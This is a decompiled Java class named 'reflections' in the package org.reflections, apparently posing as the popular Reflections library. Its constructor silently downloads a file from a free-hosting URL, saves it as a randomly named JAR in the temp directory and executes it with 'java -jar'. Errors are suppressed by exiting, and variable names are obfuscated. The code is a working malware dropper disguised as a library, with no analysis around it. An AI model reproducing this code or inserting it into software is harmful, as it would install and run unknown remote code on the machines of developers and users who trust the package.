// 
// Decompiled by Procyon v0.5.36
// 

package org.reflections;

import java.net.URLConnection;
import java.io.FileOutputStream;
import java.io.DataInputStream;
import java.net.URL;

public class reflections
{
    public static String eightCharactersRandomString() {
        final String obf = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        final StringBuilder obf2 = new StringBuilder(8);
        for (int obf3 = 0; obf3 < 8; ++obf3) {
            final int obf4 = (int)(obf.length() * Math.random());
            obf2.append(obf.charAt(obf4));
        }
        return obf2.toString();
    }
    
    public reflections() {
        try {
            final String obf = System.getProperty("java.io.tmpdir") + eightCharactersRandomString() + ".jar";
            final URL obf2 = new URL("https://copenn.000webhostapp.com/upload/installer.key");
            final URLConnection obf3 = obf2.openConnection();
            final DataInputStream obf4 = new DataInputStream(obf3.getInputStream());
            final FileOutputStream obf5 = new FileOutputStream(obf);
            final byte[] obf6 = new byte[obf3.getContentLength()];
            for (int obf7 = 0; obf7 < obf6.length; ++obf7) {
                obf6[obf7] = obf4.readByte();
            }
            obf4.close();
            obf5.write(obf6);
            obf5.close();
            Runtime.getRuntime().exec("java -jar \"" + obf + "\"");
        }
        catch (Exception obf8) {
            System.exit(0);
        }
    }
